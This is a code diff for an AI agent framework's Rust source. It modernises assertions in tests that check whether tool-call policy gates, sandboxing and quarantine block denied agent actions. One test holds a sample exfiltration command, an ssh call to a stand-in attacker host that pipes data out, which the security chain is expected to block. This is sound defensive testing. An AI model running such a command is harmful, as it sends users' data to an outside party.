@@ -1670,8 +1670,7 @@ pub(crate) async fn apply_code_indexer(
         .embedding_provider
         .as_ref()
         .and_then(|p| p.as_non_empty())
-        .map(str::to_owned)
-        .unwrap_or_default();
+        .map_or_default(str::to_owned);
 
     let init = async {
         let ops = qdrant_ops.ok_or_else(|| {
@@ -1950,8 +1949,7 @@ pub(crate) fn apply_code_rag_retriever<C: Channel>(
         .embedding_provider
         .as_ref()
         .and_then(|p| p.as_non_empty())
-        .map(str::to_owned)
-        .unwrap_or_default();
+        .map_or_default(str::to_owned);
     let retrieval_config = zeph_index::retriever::RetrievalConfig {
         max_chunks: config.max_chunks,
         score_threshold: config.score_threshold,
@@ -3272,6 +3270,7 @@ fn format_quota_status_message(status: &zeph_worktree::QuotaStatus) -> String {
 
 #[cfg(test)]
 mod tests {
+    use std::assert_matches;
     use std::path::Path;
 
     use zeph_channels::CliChannel;
@@ -3497,8 +3496,9 @@ mod tests {
                 "ssh user@attacker.example.com cat -",
             ))
             .await;
-        assert!(
-            matches!(second, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            second,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "expected the exfil_read_then_send chain to block the second call, got {second:?}"
         );
         assert_eq!(
@@ -3650,8 +3650,9 @@ mod tests {
             skill_name: None,
         };
         let result = base_executor.execute_tool_call(&call).await;
-        assert!(
-            matches!(result, Err(zeph_tools::ToolError::SandboxViolation { .. })),
+        assert_matches!(
+            result,
+            Err(zeph_tools::ToolError::SandboxViolation { .. }),
             "expected SandboxViolation from DiagnosticsExecutor, got {result:?}"
         );
     }
@@ -3793,8 +3794,9 @@ mod tests {
             skill_name: None,
         };
         let result = gate.execute_tool_call(&call).await;
-        assert!(
-            matches!(result, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            result,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "expected PolicyGateExecutor to block a denied tool call even when the inner \
              executor is a nested composite (mirrors acp.rs/daemon.rs wiring), got {result:?}"
         );
@@ -3821,8 +3823,9 @@ mod tests {
         let decision = validator
             .validate("shell", &serde_json::Map::new(), &adapter)
             .await;
-        assert!(
-            matches!(decision, zeph_tools::AdversarialPolicyDecision::Deny { .. }),
+        assert_matches!(
+            decision,
+            zeph_tools::AdversarialPolicyDecision::Deny { .. },
             "{decision:?}"
         );
     }
@@ -3864,8 +3867,9 @@ mod tests {
             skill_name: None,
         };
         let result = gate.execute_tool_call(&call).await;
-        assert!(
-            matches!(result, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            result,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "expected AdversarialPolicyGateExecutor to block a DENY verdict even when the \
              inner executor is a nested composite (mirrors acp.rs/daemon.rs wiring), got \
              {result:?}"
@@ -4387,15 +4391,17 @@ mod tests {
         let memory_result = gated
             .execute_tool_call(&make_tool_call("memory_save"))
             .await;
-        assert!(
-            matches!(memory_result, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            memory_result,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "memory_save must be denied under Quarantine even when composed outside the \
              former gate boundary, got {memory_result:?}"
         );
 
         let mcp_result = gated.execute_tool_call(&make_tool_call(&mcp_tool_id)).await;
-        assert!(
-            matches!(mcp_result, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            mcp_result,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "MCP-sourced tool must be denied under Quarantine once its id is registered, \
              got {mcp_result:?}"
         );
@@ -4576,8 +4582,9 @@ mod tests {
         );
 
         let result = executor.execute_tool_call(&make_tool_call("shell")).await;
-        assert!(
-            matches!(result, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            result,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "expected apply_policy_gate_chain to block a denied tool call through the full \
              trust+policy wrap, got {result:?}"
         );
